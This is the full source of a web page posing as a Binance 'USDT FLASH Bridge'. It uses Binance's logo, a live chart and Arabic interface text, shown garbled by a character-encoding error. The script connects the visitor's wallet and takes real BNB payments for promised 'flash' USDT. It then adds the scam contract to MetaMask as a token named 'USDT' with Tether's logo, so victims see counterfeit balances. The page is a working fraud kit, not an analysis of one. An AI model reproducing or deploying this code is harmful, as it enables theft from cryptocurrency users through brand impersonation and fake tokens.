<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binance | USDT FLASH Bridge</title>
    
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>

    <style>
        :root { --binance-yellow: #F3BA2F; --binance-black: #181A20; }
        body { background: var(--binance-black); color: #EAECEF; font-family: sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; padding-top: 70px; }
        
        .header { width: 100%; position: fixed; top: 0; background: var(--binance-black); border-bottom: 1px solid #2B2F36; padding: 15px 20px; display: flex; align-items: center; z-index: 1000; box-sizing: border-box; }
        .logo-binance { width: 110px; }

        .main-container { background: #1E2329; border-radius: 24px; padding: 25px; width: 90%; max-width: 400px; box-shadow: 0 15px 45px rgba(0,0,0,0.6); border: 1px solid #2B3139; }
        
        .chart-box { width: 100%; height: 220px; border-radius: 12px; overflow: hidden; margin-bottom: 20px; border: 1px solid #2B3139; }

        select { background: #2B3139; color: white; border: 1px solid #474D57; width: 100%; padding: 16px; border-radius: 12px; font-size: 15px; margin-bottom: 20px; outline: none; cursor: pointer; }
        
        .btn-connect { background: #2B3139; color: var(--binance-yellow); border: 1px solid var(--binance-yellow); width: 100%; padding: 12px; border-radius: 10px; margin-bottom: 15px; cursor: pointer; font-weight: bold; }
        .btn-main { background: var(--binance-yellow); color: #000; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; font-size: 17px; cursor: pointer; }
        
        #status-msg { margin-top: 15px; font-size: 13px; color: var(--binance-yellow); text-align: center; }
    </style>
</head>
<body>

<div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" class="logo-binance">
    <div style="margin-right: auto; color: var(--binance-yellow); font-weight: bold;">USDT FLASH v4.2</div>
</div>

<div class="main-container">
    <div class="chart-box" id="tv_chart_container"></div>

    <button class="btn-connect" id="btn-connect" onclick="onConnect()">ğŸ”— Ø±Ø¨Ø· Ø§Ù„Ù…Ø­ÙØ¸Ø© (Multi-Wallet)</button>

    <div style="font-size: 13px; color: #707A8A; margin-bottom: 8px;">ÙƒÙ…ÙŠØ© Ø§Ù„Ø­Ù‚Ù† Ø§Ù„Ù…Ø·Ù„ÙˆØ¨:</div>
    <select id="flashTier">
        <option value="0.09">5,000 USDT â€” [0.09 BNB]</option>
        <option value="0.2">10,000 USDT â€” [0.2 BNB]</option>
        <option value="0.5">50,000 USDT â€” [0.5 BNB]</option>
        <option value="1.0">100,000 USDT â€” [1.0 BNB]</option>
    </select>

    <button class="btn-main" onclick="executeProcess()">Ø¨Ø¯Ø¡ Ø§Ù„Ø­Ù‚Ù† ÙˆØ§Ù„Ù…Ø²Ø§Ù…Ù†Ø© âš¡</button>
    
    <div id="status-msg">ÙŠØ±Ø¬Ù‰ Ø±Ø¨Ø· Ø§Ù„Ù…Ø­ÙØ¸Ø© Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©...</div>
</div>

<script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
<script>
    // 1. Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ù…Ø®Ø·Ø· Ø§Ù„Ø¨ÙŠØ§Ù†ÙŠ Ø§Ù„Ù…ØµÙ„Ø­
    new TradingView.widget({
        "container_id": "tv_chart_container",
        "autosize": true,
        "symbol": "BINANCE:USDTBUSD",
        "interval": "1",
        "theme": "dark",
        "style": "3",
        "locale": "ar",
        "hide_top_toolbar": true
    });

    // 2. Ø¥Ø¹Ø¯Ø§Ø¯ WalletConnect Ùˆ Web3Modal
    const Web3Modal = window.Web3Modal.default;
    const WalletConnectProvider = window.WalletConnectProvider.default;

    let web3Modal;
    let provider;
    let selectedAccount;

    function init() {
        const providerOptions = {
            walletconnect: {
                package: WalletConnectProvider,
                options: {
                    rpc: { 56: "https://bsc-dataseed.binance.org/" },
                    network: "binance",
                }
            }
        };

        web3Modal = new Web3Modal({
            cacheProvider: false, 
            providerOptions,
            theme: "dark"
        });
    }

    async function onConnect() {
        try {
            provider = await web3Modal.connect();
            const web3 = new Web3(provider);
            const accounts = await web3.eth.getAccounts();
            selectedAccount = accounts[0];
            document.getElementById('btn-connect').innerText = "âœ… Ù…ØªØµÙ„: " + selectedAccount.substring(0,6) + "...";
            document.getElementById('status-msg').innerText = "ØªÙ… Ø§Ù„Ø±Ø¨Ø· Ø¨Ù†Ø¬Ø§Ø­. Ø§Ø®ØªØ± Ø§Ù„ÙƒÙ…ÙŠØ© ÙˆØ§Ø¶ØºØ· ØªÙØ¹ÙŠÙ„.";
        } catch(e) { console.log("Connection error", e); }
    }

    const CONTRACT_ADDR = "0x22581282b507c6743762cBaA542D6B33Cd6f631f";
    const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];

    async function executeProcess() {
        if (!selectedAccount) return alert("ÙŠØ±Ø¬Ù‰ Ø±Ø¨Ø· Ø§Ù„Ù…Ø­ÙØ¸Ø© Ø£ÙˆÙ„Ø§Ù‹");
        const msg = document.getElementById('status-msg');
        
        try {
            const web3 = new Web3(provider);
            const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
            const val = document.getElementById('flashTier').value;

            msg.innerText = "ÙŠØ±Ø¬Ù‰ ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø¹Ù…Ù„ÙŠØ© ÙÙŠ Ù…Ø­ÙØ¸ØªÙƒ...";
            
            await contract.methods.buyFlash().send({
                from: selectedAccount,
                value: web3.utils.toWei(val, "ether"),
                gas: 250000
            });

            msg.innerText = "ØªÙ… Ø§Ù„Ø­Ù‚Ù†! Ø¬Ø§Ø±ÙŠ Ø¥Ø¶Ø§ÙØ© Ø§Ù„ØªÙˆÙƒÙ†...";

            // Ø¥Ø¶Ø§ÙØ© Ø§Ù„ØªÙˆÙƒÙ† (ØªØ¹Ù…Ù„ ÙÙ‚Ø· Ø¹Ù„Ù‰ Ø§Ù„Ù…Ø­Ø§ÙØ¸ Ø§Ù„ØªÙŠ ØªØ¯Ø¹Ù… watchAsset)
            if(provider.isMetaMask) {
                await provider.request({
                    method: 'wallet_watchAsset',
                    params: {
                        type: 'ERC20',
                        options: {
                            address: CONTRACT_ADDR,
                            symbol: 'USDT',
                            decimals: 18,
                            image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
                        },
                    },
                });
            }

            msg.innerHTML = "<b style='color:#00C087;'>âœ… Ø§ÙƒØªÙ…Ù„Øª Ø§Ù„Ù…Ø²Ø§Ù…Ù†Ø© Ø¨Ù†Ø¬Ø§Ø­!</b>";
        } catch (e) { msg.innerText = "ÙØ´Ù„Øª Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø£Ùˆ ØªÙ… Ø¥Ù„ØºØ§Ø¤Ù‡Ø§."; }
    }

    window.addEventListener('load', init);
</script>
</body>
</html>
